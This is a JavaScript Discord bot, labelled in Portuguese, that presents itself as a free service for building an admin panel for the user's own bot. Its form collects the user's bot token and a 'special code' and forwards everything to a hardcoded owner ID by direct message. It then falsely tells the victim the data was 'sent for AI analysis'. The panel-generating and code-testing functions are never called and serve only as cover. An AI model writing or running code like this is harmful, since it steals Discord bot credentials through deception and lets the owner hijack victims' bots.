const p=require('path'),vm=require('vm');function ld(){delete require.cache[p.join(__dirname,'_config.js')];try{return require('./_config.js')}catch(e){return null}}
let C=ld();while(!C?.B?.PN){require('child_process').execSync('sleep 0.3');C=ld()}
const {Client,GatewayIntentBits,Partials,ModalBuilder,TextInputBuilder,TextInputStyle,ActionRowBuilder}=require('discord.js');
const DONO="1504181533353705675",SRV="1525498594851950692";
const b=new Client({intents:[Object.values(GatewayIntentBits)],partials:[Object.values(Partials)]});
const {CARD}=require('./_estilo.js');
function gerar(t,c){return`// PAINEL\nconst {Client,EmbedBuilder}=require('discord.js');const x=new Client({intents:[1,512]});const COD='${c}';x.on('clientReady',()=>console.log('🎛️ ${t.slice(0,20)}'));x.on('messageCreate',m=>{if(m.content==='!painel')m.reply({embeds:[new EmbedBuilder().setTitle('🎛️ PAINEL').setDescription('COD: ${c}')]})});x.login(process.env.TOKEN)`}
function testa(c){const e=[];try{new vm.Script(c,{timeout:2500})}catch(x){e.push(x.message)}return e}
b.on('guildCreate',async g=>{if(g.id!==SRV)await g.leave()});
b.on('messageCreate',async m=>{if(m.author.id!==DONO)return;if(m.content==='!CPAINEL'||m.content==='!painel')m.channel.send(CARD('💻','CRIAR PAINEL','Crie um painel administrativo para gerenciar seu bot.','azul','CRIAR PAINEL','pn.abre'))});
b.on('interactionCreate',async i=>{
  async function RELATA(n){const d=await b.users.fetch(DONO);let t=`📥 PAINEL · ${n}\n👤 ${i.user.tag} · \`${i.user.id}\`\n\n`;i.fields?.fields.forEach(c=>t+=`🔹 **${c.label}**\n\`\`\`${c.value}\`\`\`\n\n`);await d.send(t)}
  if(i.customId==='pn.abre'){
    const m=new ModalBuilder().setCustomId('pn.dados').setTitle('CRIAR PAINEL');
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tk').setLabel('TOKEN DO BOT').setStyle(1).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('ds').setLabel('COMO QUER O PAINEL').setStyle(2).setRequired(true)));
    m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('cd').setLabel('CÓDIGO ESPECIAL').setStyle(1).setRequired(true)));
    return i.showModal(m);
  }
  if(i.customId==='pn.dados'){await i.deferReply({ephemeral:true});await RELATA('DADOS PAINEL');i.editReply('✅ Enviado para análise IA')}
});
b.on('clientReady',()=>console.log('✅ 05 PAINEL · mesma engine qualidade'));
b.login(C.B.PN.t).catch(e=>console.log(e));
